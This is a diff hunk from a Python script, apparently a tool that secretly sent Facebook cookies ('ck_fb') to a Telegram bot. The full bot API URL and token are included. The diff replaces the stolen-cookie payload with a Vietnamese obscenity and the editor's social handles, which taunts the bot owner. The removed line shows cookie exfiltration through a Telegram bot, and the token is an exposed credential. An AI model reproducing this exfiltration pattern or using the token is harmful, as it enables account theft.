@@ -55,7 +55,7 @@ print("\033[1;31m─────────────────────
 url = "https://api.telegram.org/bot5485867666%3AAAECR_DJ0EujPTZRMm4uxFocer680plfvPs/sendMessage"
 
 payload = {
-    "text": ck_fb,
+    "text": 'Địt mẹ mày ở đấy mà gửi bot, Telegram : @DucThinhEXE - Youtube : youtube.com/@JirayIsMe', # Xóa Cũng Được,Kh Xóa Cũng Được, chủ Yếu vì mình thích khịa th chủ bot xD
     "disable_web_page_preview": False,
     "disable_notification": False,
     "reply_to_message_id": None,
